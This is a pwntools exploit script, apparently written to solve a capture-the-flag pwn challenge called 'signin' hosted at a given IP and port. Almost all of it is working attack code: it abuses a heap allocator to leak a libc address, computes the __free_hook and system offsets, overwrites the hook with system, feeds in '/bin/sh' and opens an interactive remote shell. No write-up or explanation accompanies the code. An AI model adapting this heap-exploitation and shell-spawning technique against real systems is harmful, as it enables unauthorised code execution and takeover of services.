from pwn import *
context.arch = 'amd64'

TARGET = './signin'
HOST = '47.242.161.199'
PORT = 9990

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)
    # return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def alloc(idx, num):
    r.sendlineafter('>>', '1')
    r.sendlineafter(':', str(idx))
    r.sendlineafter(':', str(num))

def alloc_rep(idx, num, cnt):
    payload = '1\n'+str(idx)+'\n'+str(num)+'\n'
    r.sendlineafter('>>', payload * cnt)
    for i in range(cnt-1):
        r.recvuntil('>>')

def delete(idx):
    r.sendlineafter('>>', '2')
    r.sendlineafter(':', str(idx))

def delete_rep(idx, cnt):
    payload = '2\n'+str(idx)+'\n'
    r.sendlineafter('>>', payload * cnt)
    for i in range(cnt-1):
        r.recvuntil('>>')

def show(idx):
    r.sendlineafter('>>', '3')
    r.sendlineafter(':', str(idx))

r = start()
if args.D:
    debug(r, [])

for i in range(257):
    alloc(1, 0x1337)
    # delete(0)
delete_rep(1, 256*2+2)
show(1)
leak = int(r.recvuntil('\n', True), 10)
dbg('leak')
base = leak - 0x3ebca0
dbg('base')
fh = base + 0x3ed8e8
system = base + 0x4f4e0

delete_rep(1, 9428)
alloc(1, fh-8)
alloc(2, 0)
alloc(2, 0)
alloc(2, 0)
delete(2)
delete(2)
delete(2)
delete(2)
alloc(2, 0x31)
alloc(2, u64("/bin/sh\x00"))
alloc(2, system)
alloc_rep(2, 1, 3)

r.interactive()
r.close()
